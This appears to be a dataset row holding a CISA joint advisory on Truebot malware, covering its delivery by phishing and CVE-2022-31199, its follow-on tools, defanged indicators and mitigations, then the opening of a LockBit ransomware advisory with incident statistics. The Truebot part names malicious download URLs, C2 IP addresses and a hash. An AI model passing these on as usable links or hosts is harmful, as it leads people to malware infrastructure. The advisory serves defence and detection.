Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E]. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory (AD) level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

In addition, CISA, FBI, MS-ISAC, and CCCS recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization minimizes the impact of disruption to business practices as they can retrieve their data [CPG 2.R]. 
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to various subnetworks, restricting further lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections, as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 5-13).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: NVD - CVE-2022-31199
Stopransomware.gov (A whole-of-government approach with one central location for U.S. ransomware resources and alerts.)
#StopRansomware Guide
CISA: Implement Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software
CISA and MS-ISAC: Joint Ransomware Guide
CISA: Cross-Sector Cybersecurity Performance Goals
CL0P Ransomware Uses Truebot Malware for Access to Networks
Field Offices – FBI
NSA – Zero Trust Security Model

REFERENCES
[1] Bishop Fox: Netwrix Auditor Advisory[2] Talos Intelligence: Breaking the Silence - Recent Truebot Activity[3] The DFIR Report: Truebot Deploys Cobalt Strike and FlawedGrace[4] MAR-10445155-1.v1 .CLEAR Truebot Activity Infects U.S. and Canada Based Networks[5] Red Canary: Raspberry Robin Delivery Vector[6] Microsoft: Raspberry Robin Worm Part of a Larger Ecosystem Pre-Ransomware Activity[7] Telsy: FlawedGrace RAT[8] VMware Security Blog: Carbon Black’s Truebot Detection[9] GitHub: DFIR Report - Truebot Malware YARA Rule
Additional Sources
Alarming Surge in TrueBot Activity Revealed with New Delivery Vectors (thehackernews.com)Truebot Analysis Part 1Truebot Analysis Part 2Truebot Analysis Part 3Truebot Exploits Netwrix VulnerabilityTrueBot malware delivery evolves, now infects businesses in the US and elsewhere Malpedia-Silence DownloaderPrinter spooling: what is it and how to fix it? | PaperCut
ACKNOWLEDGEMENTS
VMware Carbon Black and Mandiant contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and authoring agencies do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, and co-sealers.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1573.002', 'T1030', 'T1027.001', 'T1566.002', 'T1622', 'T1547.012', 'T1027.009', 'TA0010', 'T1005', 'T1563.001', 'T1204.002', 'T1016', 'T1190', 'T1210', 'T1003.001', 'T1105', 'T1112', 'T1082', 'T1029', 'T1113', 'T1550.002', 'T1055.001', 'T1091', 'T1204.001', 'T1027', 'T1070.004', 'T1518.001', 'T1057', 'T1570', 'T1620', 'T1071', 'T1129', 'T1059', 'T1563.002', 'T1189', 'T1095', 'T1124', 'T1055', 'T1036.008', 'T1048', 'T1036'}","



SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Canadian Centre for Cyber Security (CCCS) are releasing this joint Cybersecurity Advisory (CSA) in response to cyber threat actors leveraging newly identified Truebot malware variants against organizations in the United States and Canada. As recently as May 31, 2023, the authoring organizations have observed an increase in cyber threat actors using new malware variants of Truebot (also known as Silence.Downloader). Truebot is a botnet that has been used by malicious cyber groups like CL0P Ransomware Gang to collect and exfiltrate information from its target victims.
Previous Truebot malware variants were primarily delivered by cyber threat actors via malicious phishing email attachments; however, newer versions allow cyber threat actors to also gain initial access through exploiting CVE-2022-31199—(a remote code execution vulnerability in the Netwrix Auditor application), enabling deployment of the malware at scale within the compromised environment. Based on confirmation from open-source reporting and analytical findings of Truebot variants, the authoring organizations assess cyber threat actors are leveraging both phishing campaigns with malicious redirect hyperlinks and CVE-2022-31199 to deliver new Truebot malware variants.
The authoring organizations recommend hunting for the malicious activity using the guidance outlined in this CSA, as well as applying vendor patches to Netwrix Auditor (version 10.5—see Mitigations section below).,1, Any organization identifying indicators of compromise (IOCs) within their environment should urgently apply the incident responses and mitigation measures detailed in this CSA and report the intrusion to CISA or the FBI.
Download the PDF version of this report:


AA23-187A Increased Truebot Activity Infects U.S. and Canada Based Networks
(PDF,       891.26 KB
  )


Read the associated Malware Analysis Report MAR-10445155-1.v1 Truebot Activity Infects U.S. and Canada Based Networks or download the PDF version below:


MAR-10445155-1.v1 Truebot Activity Infects U.S. and Canada Based Networks
(PDF,       315.39 KB
  )


For a downloadable copy of IOCs in .xml and .json format, see:


AA23-187A STIX XML
(XML,       204.54 KB
  )




AA23-187A STIX JSON
(JSON,       140.24 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section below for cyber threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Initial Access and Execution
In recent months, open source reporting has detailed an increase in Truebot malware infections, particularly cyber threat actors using new tactics, techniques, and procedures (TTPs), and delivery methods.,2, Based on the nature of observed Truebot operations, the primary objective of a Truebot infection is to exfiltrate sensitive data from the compromised host(s) for financial gain,.

Phishing:

Cyber threat actors have historically used malicious phishing emails as the primary delivery method of Truebot malware, which tricks recipients into clicking a hyperlink to execute malware. Cyber threat actors have further been observed concealing email attachments (executables) as software update notifications, that appear to be legitimate,. Following interaction with the executable, users will be redirected to a malicious web domain where script files are then executed. Note: Truebot malware can be hidden within various, legitimate file formats that are used for malicious purposes,.,3,


Exploitation of CVE-2022-31199:

Though phishing remains a prominent delivery method, cyber threat actors have shifted tactics, exploiting, in observable manner, a remote code execution vulnerability (CVE-2022-31199) in Netwrix Auditor,—software used for on-premises and cloud-based IT system auditing. Through exploitation of this CVE, cyber threat actors gain initial access, as well as the ability to move laterally within the compromised network,.




 

Figure 1: CVE-2022-31199 Delivery Method for Truebot

Following the successful download of the malicous file, Truebot renames itself and then loads FlawedGrace onto the host. Please see the FlawedGrace section below for more information on how this remote access tool (RAT) is used in Truebot operations.
After deployment by Truebot, FlawedGrace is able to modify registry, and print spooler programs, that control the order that documents are loaded to a print queue. FlawedGrace manipulates these features to both escalate privilege and establish persistence.
During FlawedGrace’s execution phase, the RAT stores encrypted payloads, within the registry. The tool can create scheduled tasks and inject payloads into msiexec,.,exe and svchost,.,exe, which are command processes that enable FlawedGrace to establish a command and control (C2) connection to 92.118.36,.,199, for example, as well as load dynamic link libraries (DLLs), to accomplish privilege escalation.
Several hours post initial access, Truebot has been observed injecting Cobalt Strike beacons into memory, in a dormant mode for the first few hours prior to initiating additional operations. Please see the Cobalt Strike section below for more information on how this remote access tool (RAT) is used in Truebot operations.
Discovery and Defense Evasion
During the first stage of Truebot’s execution process, it checks the current version of the operating system (OS) with RtlGetVersion and processor architecture using GetNativeSystemInfo,.,4, Note: This variant of Truebot malware is designed with over one gigabyte (GB) of junk code which functions to hinder detection and analysis efforts,.
Following the initial checks for system information, Truebot has the capability to enumerate all running processes, collect sensitive local host data, and send this data to an encoded data string described below for second-stage execution. Based on IOCs in table 1, Truebot also has the ability to discover software security protocols and system time metrics, which aids in defense evasion, as well as enables synchronization with the compromised system’s internal clock to facilitate scheduling tasks,.
Next, it uses a .JSONIP extension, (e.g., IgtyXEQuCEvAM.JSONIP), to create a thirteen character globally unique identifier (GUID)—a 128-bit text string that Truebot uses to label and organize the data it collects,.
After creating the GUID, Truebot compiles and enumerates running process data into either a base64 or unique hexadecimal encoded string,. Truebot’s main goal is identifying the presence of security debugger tools. However, the presence of identified debugger tools does not change Truebot’s execution process—the data is compiled into a base64 encoded string for tracking and defense evasion purposes,.
Data Collection and Exfiltration
Following Truebot’s enumeration of running processes and tools, the affected system’s computer and domain name, along with the newly generated GUID, are sent to a hard-coded URL in a POST request (as observed in the user-agent string). Note: A user-agent string is a customized HTTP request that includes specific device information required for interaction with web content. In this instance, cyber threat actors can redirect victims to malicious domains and further establish a C2 connection.
The POST request functions as means for establishing a C2 connection for bi-lateral communication. With this established connection, Truebot uses a second obfuscated domain to receive additional payloads, self-replicate across the environment, and/or delete files used in its operations,. Truebot malware has the capability to download additional malicious modules, load shell code, and deploy various tools to stealthily navigate an infected network.
Associated Delivery Vectors and Tools
Truebot has been observed in association with the following delivery vectors and tools:
Raspberry Robin (Malware)
Raspberry Robin is a wormable malware with links to other malware families and various infection methods, including installation via USB drive,.,5, Raspberry Robin has evolved into one of the largest malware distribution platforms and has been observed deploying Truebot, as well as other post-compromise payloads such as IcedID and Bumblebee malware.,6, With the recent shift in Truebot delivery methods from malicious emails to the exploitation of CVE-2022-31199, a large number of Raspberry Robin infections have leveraged this exploitable CVE.,2,
Flawed Grace (Malware)
FlawedGrace is a remote access tool (RAT) that can receive incoming commands, from a C2 server sent over a custom binary protocol, using port 443 to deploy additional tools,.,7, Truebot malware has been observed leveraging (and dropping) FlawedGrace via phishing campaigns as an additional payload,.,8, Note: FlawedGrace is typically deployed minutes after Truebot malware is executed.
Cobalt Strike (Tool)
Cobalt Strike is a popular remote access tool (RAT) that cyber threat actors have leveraged—in an observable manner—for a variety of post-exploitation means. Typically a few hours after Truebot’s execution phase, cyber threat actors have been observed deploying additional payloads containing Cobalt Strike beacons for persistence and data exfiltration purposes,.,2, Cyber threat actors use Cobalt Strike to move laterally via remote service session hijacking, collecting valid credentials through LSASS memory credential dumping, or creating local admin accounts to achieve pass the hash alternate authentication,.
Teleport (Tool)
Cyber threat actors have been observed using a custom data exfiltration tool, which Talos has named “Teleport.”,2, Teleport is known to evade detection during data exfiltration by using an encryption key hardcoded in the binary and a custom communication protocol, that encrypts data using advanced encryption standard (AES) and a hardcoded key,. Furthermore, to maintain its stealth, Teleport limits the data it collects and syncs with outbound organizational data/network traffic,.
Truebot Malware Indicators of Compromise (IOCs)
Truebot IOCs from May 31, 2023, contain IOCs from cyber threat actors conducting Truebot malspam campaigns. Information is derived from a trusted third party, they observed cyber threat actors from 193.3.19,.,173 (Russia) using a compromised local account to conduct phishing campaigns on May 23, 2023 and spread malware through: https,:,//snowboardspecs,.,com/nae9v, which then promptly redirects the user to: https://www.meditimespharma,.,com/gfghthq/, which a trusted third party has linked to other trending Truebot activity.
After redirecting to https://www.meditimespharma,.,com/gfghthq/, trusted third parties have observed, the cyber threat actors using Truebot to pivot to https://corporacionhardsoft,.,com/images/2/Document_16654.exe, which is a domain associated with snowboardspecs,.,com. This malicious domain has been linked to UNC4509, a threat cluster that has been known to use traffic distribution systems (TDS) to redirect users to either a benign or malicious website to facilitate their malicious phishing campaigns in May 2023.
According to trusted third parties, the MD5 Hash: 6164e9d297d29aa8682971259da06848 is downloaded from https://corporacionhardsoft.com/images/2/Document_16654,.,exe, and has been flagged by numerous security vendors, as well as is linked to UNC4509 Truebot campaigns. Note: These IOCs are associated with Truebot campaigns used by Graceful Spider to deliver FlawedGrace and LummaStealer payloads in May of 2023.
After Truebot is downloaded, the malware copies itself to C:\Intel\RuntimeBroker.exe and—based on trusted third party analysis—links to https://essadonio.com/538332,.,php (which is linked to 45.182.189,.,71 (Panama) and is associated with other trending Truebot malware campaigns from May 2023).
Please reference table 1 for IOCs described in the paragraph above.

 

 

 

 

 
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 6-16 for all referenced cyber threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

 

 

 

 

 

 

 

 

 

 

 
DETECTION METHODS
CISA and authoring organizations recommend that organizations review and implement the following detection signatures, along with: Win/malicious_confidence100% (W), Trojan:Win32/Tnega!MSR, and Trojan.Agent.Truebot.Gen, as well as YARA rules below to help detect Truebot malware.
Detection Signatures

 
YARA Rules
CISA developed the following YARA to aid in detecting the presence of Truebot Malware.


Additional YARA rules for detecting Truebot malware can be referenced from GitHub.,9,

INCIDENT RESPONSE
The following steps are recommended if organizations detect a Truebot malware infection and compromise:

Quarantine or take offline potentially affected hosts.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Provision new account credentials.
Reimage compromised host.
Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or contact your local FBI field office. State, local, tribal, or territorial government entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722).

MITIGATIONS
CISA and the authoring organizations recommend organizations implement the below mitigations, including mandating phishing-resistant multifactor authentication (MFA) for all staff and services.
For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and co-sealers recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).

Apply patches to CVE-2022-31199
Update Netwrix Auditor to version 10.5

Netwrix recommends using their Auditor application only on internally facing networks. System owners that don't follow this recommendation, and use the application in externally facing instances, are at increased risk to having CVE-2022-31199 exploited on their systems.
Reduce threat of malicious actors using remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.



See the National Security Agency’s Cybersecurity Information sheet, Enforce Signed Software Execution Policies, and additional guidance below:

Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Restrict the use of PowerShell by using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical OS and registry interaction and possible IOCs of a cyber threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. The authoring organizations recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 4.C,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP),CPG 2.E,.
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher,CPG 2.A, 2.E,. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory (AD) level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

In addition, CISA, FBI, MS-ISAC, and CCCS recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization minimizes the impact of disruption to business practices as they can retrieve their data,CPG 2.R,. 
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to various subnetworks, restricting further lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections, as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 5-13).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: NVD - CVE-2022-31199
Stopransomware.gov (A whole-of-government approach with one central location for U.S. ransomware resources and alerts.)
#StopRansomware Guide
CISA: Implement Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software
CISA and MS-ISAC: Joint Ransomware Guide
CISA: Cross-Sector Cybersecurity Performance Goals
CL0P Ransomware Uses Truebot Malware for Access to Networks
Field Offices – FBI
NSA – Zero Trust Security Model

REFERENCES,1, Bishop Fox: Netwrix Auditor Advisory,2, Talos Intelligence: Breaking the Silence - Recent Truebot Activity,3, The DFIR Report: Truebot Deploys Cobalt Strike and FlawedGrace,4, MAR-10445155-1.v1 .CLEAR Truebot Activity Infects U.S. and Canada Based Networks,5, Red Canary: Raspberry Robin Delivery Vector,6, Microsoft: Raspberry Robin Worm Part of a Larger Ecosystem Pre-Ransomware Activity,7, Telsy: FlawedGrace RAT,8, VMware Security Blog: Carbon Black’s Truebot Detection,9, GitHub: DFIR Report - Truebot Malware YARA Rule
Additional Sources
Alarming Surge in TrueBot Activity Revealed with New Delivery Vectors (thehackernews.com)Truebot Analysis Part 1Truebot Analysis Part 2Truebot Analysis Part 3Truebot Exploits Netwrix VulnerabilityTrueBot malware delivery evolves, now infects businesses in the US and elsewhere Malpedia-Silence DownloaderPrinter spooling: what is it and how to fix it? | PaperCut
ACKNOWLEDGEMENTS
VMware Carbon Black and Mandiant contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and authoring agencies do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, and co-sealers.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-187a
24,"



SUMMARY
In 2022, LockBit was the most deployed ransomware variant across the world and continues to be prolific in 2023. Since January 2020, affiliates using LockBit have attacked organizations of varying sizes across an array of critical infrastructure sectors, including financial services, food and agriculture, education, energy, government and emergency services, healthcare, manufacturing, and transportation. LockBit ransomware operation functions as a Ransomware-as-a-Service (RaaS) model where affiliates are recruited to conduct ransomware attacks using LockBit ransomware tools and infrastructure. Due to the large number of unconnected affiliates in the operation, LockBit ransomware attacks vary significantly in observed tactics, techniques, and procedures (TTPs). This variance in observed ransomware TTPs presents a notable challenge for organizations working to maintain network security and protect against a ransomware threat.
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the following international partners, hereafter referred to as “authoring organizations,” are releasing this Cybersecurity Advisory (CSA) detailing observed activity in LockBit ransomware incidents and providing recommended mitigations to enable network defenders to proactively improve their organization’s defenses against this ransomware operation. 

Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS)
United Kingdom’s National Cyber Security Centre (NCSC-UK)
National Cybersecurity Agency of France (ANSSI)
Germany’s Federal Office for Information Security (BSI)
New Zealand’s Computer Emergency Response Team (CERT NZ) and National Cyber Security Centre (NCSC NZ) 

The authoring organizations encourage the implementation of the recommendations found in this CSA to reduce the likelihood and impact of future ransomware incidents.


Understanding Ransomware Threat Actors: LockBit
(PDF,       1.24 MB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13.1. See the MITRE ATT&CK Tactics and Techniques section for tables of LockBit’s activity mapped to MITRE ATT&CK® tactics and techniques.
Introduction
The LockBit RaaS and its affiliates have negatively impacted organizations, both large and small, across the world. In 2022, LockBit was the most active global ransomware group and RaaS provider in terms of the number of victims claimed on their data leak site. [1] A RaaS cybercrime group maintains the functionality of a particular ransomware variant, sells access to that ransomware variant to individuals or groups of operators (often referred to as “affiliates”), and supports affiliates’ deployment of their ransomware in exchange for upfront payment, subscription fees, a cut of profits, or a combination of upfront payment, subscription fees, and a cut of profits. Some of the methods LockBit has used to successfully attract affiliates include, but are not limited to:

Assuring payment by allowing affiliates to receive ransom payments before sending a cut to the core group; this practice stands in stark contrast to other RaaS groups who pay themselves first and then disburse the affiliates’ cut.
Disparaging other RaaS groups in online forums.
Engaging in publicity-generating activities stunts, such as paying people to get LockBit tattoos and putting a $1 million bounty on information related to the real-world identity of LockBit’s lead who goes by the persona “LockBitSupp.”
Developing and maintaining a simplified, point-and-click interface for its ransomware, making it accessible to those with a lower degree of technical skill. [2, 3]

LockBit has been successful through innovation and ongoing development of the group’s administrative panel and the RaaS supporting functions. In parallel, affiliates that work with LockBit and other notable variants are constantly revising the TTPs used for deploying and executing ransomware.
Table 1 shows LockBit RaaS’s innovation and development.
Table 1: Evolution of LockBit RaaS



Date
Event


September 2019
First observed activity of ABCD ransomware, the predecessor to LockBit. [4]


January 2020
LockBit-named ransomware first seen on Russian-language based cybercrime forums.


June 2021
Appearance of LockBit version 2 (LockBit 2.0), also known as LockBit Red including StealBit, a built-in information-stealing tool.


October 2021
Introduction of LockBit Linux-ESXi Locker version 1.0 expanding capabilities to target systems to Linux and VMware ESXi. [5]


March 2022
Emergence of LockBit 3.0, also known as LockBit Black, that shares similarities with BlackMatter and Alphv (also known as BlackCat) ransomware.


September 2022
Non-LockBit affiliates able to use LockBit 3.0 after its builder was leaked. [2, 6]


January 2023
Arrival of LockBit Green incorporating source code from Conti ransomware. [7]


April 2023
LockBit ransomware encryptors targeting macOS seen on VirusTotal [8, 9]



LockBit 2.0, LockBit 3.0, LockBit Green, and LockBit Linux-ESXi Locker are still available for affiliates’ use on LockBit’s panel.
LockBit Statistics
Percentage of ransomware incidents attributed to LockBit:

Australia: From April 1, 2022, to March 31, 2023, LockBit made up 18% of total reported Australian ransomware incidents. This figure includes all variants of LockBit ransomware, not solely LockBit 3.0.
Canada: In 2022, LockBit was responsible for 22% of attributed ransomware incidents in Canada.[10]
New Zealand: In 2022, CERT NZ received 15 reports of LockBit ransomware, representing 23% of 2022 ransomware reports.
United States: In 2022, 16% of the State, Local, Tribal, and Tribunal (SLTT) government ransomware incidents reported to the MS-ISAC were identified as LockBit attacks. This included ransomware incidents impacting municipal governments, county governments, public higher education and K-12 schools, and emergency services (e.g., law enforcement).

Number of LockBit ransomware attacks in the U.S. since 2020:

About 1,700 attacks according to the FBI.

Total of U.S. ransoms paid to LockBit:

Approximately $91M since LockBit activity was first observed in the U.S. on January 5, 2020.

Earliest observed LockBit activity:

Australia: The earliest documented occurrence of LockBit 3.0 was in early August 2022.
Canada: The first recorded instance of LockBit activity in Canada was in March 2020.
New Zealand: The first recorded incident involving LockBit ransomware was in March 2021.
United States: LockBit activity was first observed on January 5, 2020.

Most recently observed LockBit activity:

Australia: April 21, 2023.
New Zealand: February 2023.
United States: As recently as May 25, 2023.

Operational activity related to LockBit in France
Since the first case in July 2020 to present, ANSSI has handled 80 alerts linked to the LockBit ransomware, which accounts for 11% of all ransomware cases handled by ANSSI in that period. In about 13% of those cases, ANSSI was not able to confirm nor deny the breach of its constituents’ networks – as the alerts were related to the threat actor’s online claims. So far, 69 confirmed incidents have been handled by ANSSI. Table 2 shows the LockBit activity observed by ANSSI versus overall ransomware activity tracked by the Computer Emergency Response Team-France (CERT-FR).
Table 2: ANSSI-Observed LockBit vs. Overall Ransomware Activity



Year
Number of Incidents
Percentage of CERT-FR’s Ransomware-Related Activity


2020 (from July)
4
2%


2021
20
10%


2022
30
27%


2023
15
27%


Total (2020-2023)
69
11%



Table 3 shows the number of instances different LockBit strains were observed by ANSSI from July 2020 to present.
Table 3: ANSSI-Observed LockBit Strain and Number of Instances



Name of the Strain*
Number of Instances


LockBit 2.0 (LockBit Red)
26


LockBit 3.0 (LockBit Black)
23


LockBit
21


LockBit Green
1


LockBit (pre-encryption)
1


Total
72**



* Name either obtained from ANSSI’s or the victim’s investigations** Includes incidents with multiple strains

 


Figure 1: ANSSI-Observed LockBit Strains by Year
